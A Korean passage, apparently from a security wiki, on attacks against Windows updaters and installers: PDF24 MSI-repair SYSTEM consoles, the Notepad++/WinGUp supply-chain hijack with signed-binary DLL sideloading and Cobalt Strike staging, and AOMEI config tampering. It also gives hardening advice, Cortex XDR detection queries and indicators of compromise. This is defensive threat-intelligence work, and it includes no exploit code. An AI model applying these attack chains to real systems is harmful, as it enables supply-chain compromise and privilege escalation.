PDF24 Creator 11.15.1은 별도의 MSI-repair 위험을 보여 줍니다. 복구 중 프린터 설치 custom action이 SYSTEM 권한으로 눈에 보이는 콘솔을 시작할 수 있습니다. 공급업체는 이 동작을 해결하기 위해 11.15.2에서 MSI installer를 변경했습니다. 이전 제품 버전은 초기 조사 단서일 뿐입니다. 등록되었거나 접근 가능한 MSI package, 해당 사용자가 복구를 시작할 수 있는지, 취약한 custom action 및 로그 파일 지연이 존재하는지, 대화형 데스크톱에서 콘솔이 보이는지 확인하세요. 보고된 지연에는 `faxPrnInst.log`에 대한 oplock이 사용되었습니다. 일반적인 파일 쓰기 권한만으로 접근 조건이 충족되지는 않습니다. 비대화형 셸, 접근할 수 없는 package 또는 패치된 installer로 인해 공격 체인이 끊길 수 있습니다. 이 문제는 `AlwaysInstallElevated`에 의존하지 않으며, 예측 가능한 임시 스크립트를 교체하는 방식과도 다릅니다.

---
## 취약한 updater 검증을 통한 원격 공급망 하이재킹 (WinGUp / Notepad++)

2025년 6월부터 2025년 12월까지, Notepad++ 업데이트 흐름의 호스팅 인프라를 침해한 공격자들은 선택한 피해자에게 악성 manifest를 선별적으로 제공했습니다. 이전 WinGUp 기반 updater는 업데이트의 진위를 완전히 검증하지 않아, 악의적인 XML 응답으로 클라이언트를 공격자가 제어하는 URL로 리디렉션할 수 있었습니다. 클라이언트가 신뢰할 수 있는 인증서 체인과 다운로드한 installer의 유효한 PE signature를 모두 확인하지 않고 HTTPS 콘텐츠를 수락했기 때문에, 피해자는 트로이 목마화된 NSIS `update.exe`를 다운로드하고 실행했습니다.<sup>[[12]](#references)[[13]](#references)</sup>

운영 흐름 (로컬 exploit 불필요):
1. **인프라 가로채기**: CDN/호스팅을 침해하고 공격자 메타데이터를 포함한 업데이트 확인 응답을 보내 악성 다운로드 URL을 지정합니다.
2. **트로이 목마화된 NSIS**: installer가 payload를 다운로드/실행하고 두 가지 실행 체인을 악용합니다.
   - **사용자 제공 서명 바이너리 + sideload**: 서명된 Bitdefender `BluetoothService.exe`를 함께 넣고 검색 경로에 악성 `log.dll`을 배치합니다. 서명된 바이너리가 실행되면 Windows가 `log.dll`을 sideload하고, 이 DLL은 Chrysalis backdoor를 복호화하고 reflectively load합니다 (정적 탐지를 어렵게 하기 위해 Warbird 보호 및 API hashing 적용).
   - **스크립트 기반 shellcode injection**: NSIS가 Win32 API (예: `EnumWindowStationsW`)를 사용해 shellcode를 주입하고 Cobalt Strike Beacon을 준비하는 컴파일된 Lua script를 실행합니다.<sup>[[12]](#references)</sup>

모든 auto-updater에 적용할 보안 강화/탐지 사항:
- 다운로드한 installer의 **인증서 + signature 검증**을 강제합니다 (공급업체 signer를 pin하고 CN/chain 불일치는 거부). 업데이트 manifest 자체에도 signature를 적용합니다 (예: XMLDSig). 검증되지 않은 manifest 기반 redirect를 차단합니다.
- **BYO signed binary sideloading**을 다운로드 후 탐지의 전환점으로 활용합니다. 서명된 공급업체 EXE가 정식 설치 경로 밖의 DLL 이름을 로드할 때 (예: Bitdefender가 Temp/Downloads에서 `log.dll`을 로드할 때), 그리고 updater가 비공급업체 signature를 가진 installer를 temp에 내려놓거나 실행할 때 경고합니다.
- 이 체인에서 관찰된 **malware-specific artifact**를 모니터링합니다 (일반적인 탐지 전환점으로 유용함): mutex `Global\Jdhfv_1.0.1`, `%TEMP%`에 대한 비정상적인 `gup.exe` 쓰기, Lua 기반 shellcode injection 단계.
- Notepad++는 v8.8.9 이후 WinGUp을 강화했습니다. 반환된 XML에 이제 signature가 적용되며 (XMLDSig), 최신 빌드는 전송 계층만 신뢰하지 않고 다운로드한 installer의 인증서 + signature 검증을 강제합니다.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code>가 Notepad++가 아닌 설치 프로그램을 실행</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

이러한 패턴은 서명되지 않은 manifest를 허용하거나 installer 서명자를 고정하지 않는 모든 updater에 적용됩니다. 네트워크 하이재킹 + 악성 installer + BYO-signed sideloading을 결합하면 “신뢰할 수 있는” 업데이트로 위장한 원격 코드 실행이 가능합니다.

### 두 번째 업데이트 트리거로서의 알림 구성

Updater는 별도의 원격 구성을 사용해 **콘텐츠를 준비하고 실행을 트리거**할 수 있습니다. 이를 위해서는 구성 또는 구성 응답을 제어해야 합니다. 보고서에는 origin에 대한 접근 권한을 어떻게 얻었는지 명시되어 있지 않습니다. AOMEI 사례에서 `down_html.ini`는 archive URL, 버전(`thrid`), MD5(`Val`)를 지정했습니다. 공격자는 버전을 높이고 URL과 이에 맞는 checksum을 함께 변경했습니다. 이는 위에서 다룬 [metadata 신뢰 경계 실패](#2-hijacking-the-update-channel-to-run-code-as-system)입니다. 추가 실행 경로는 `Notifycfg.ini`였습니다. 이 파일은 `ABNotify.exe`가 WebView에서 로컬 `file:///` URL을 통해 추출된 `upgrade-now.html`을 로드하도록 지시했습니다. 해당 페이지는 자동으로 같은 디렉터리의 executable로 이동했고, WebView는 이를 시스템 셸에 전달했습니다. 자식 프로세스는 notifier의 권한을 상속했습니다. 이 동작만으로 SYSTEM 권한이 상승한 것은 아닙니다.<sup>[[17]](#references)[[18]](#references)</sup>

Google은 정상적인 버전 확인 절차를 우회하도록 `Notifycfg.ini`에 35,000개가 넘는 반복된 더미 섹션을 넣은 사례도 보고했습니다. 이 보고서만으로 일반적인 parser 우회가 입증된 것은 아닙니다. 공격자는 5~10분 동안 변경된 원격 파일을 유지한 뒤 원상 복구했습니다. 따라서 해당 시간 동안 polling한 클라이언트만 변경된 구성을 받았습니다. 이 알림 채널에는 archive를 실행할 필요가 없는 별도의 [WebDAV/NTLM 유인](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion)도 포함되어 있었습니다.<sup>[[18]](#references)</sup>

---
## References
- [1] [자문 – Windows용 Netskope Client – 악성 서버를 통한 로컬 권한 상승 (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope 보안 자문 NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre 및 Razer Synapse 4 침해](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent의 쓰기 가능한 파일을 통한 로컬 권한 상승](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent의 권한 상승](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 국가 지원 공격자의 Notepad++ 공급망 악용](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – 하이재킹된 인프라 사고 업데이트](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows용 Netskope Client의 CVE-2025-0309 수정 우회](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage의 권한 상승 버그 발견](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: gRPC에서 SYSTEM까지](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – AOMEI Backupper 공급망 침해](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group 및 Mandiant – 일시적인 공급망 변조 조사](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
